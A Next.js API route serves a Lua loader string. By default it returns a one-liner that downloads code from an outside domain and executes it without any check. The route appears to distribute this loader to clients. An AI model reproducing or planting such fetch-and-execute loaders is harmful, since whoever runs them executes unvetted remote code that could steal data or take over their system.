import { NextResponse } from 'next/server'

export async function GET() {
  const script =
    process.env.LOADER_SCRIPT ??
    'loadstring(request({Url="https://michigun.xyz/script",Method="GET"}).Body)()'

  return NextResponse.json(
    { script },
    {
      headers: {
        'Cache-Control': 'no-store',
      },
    }
  )
}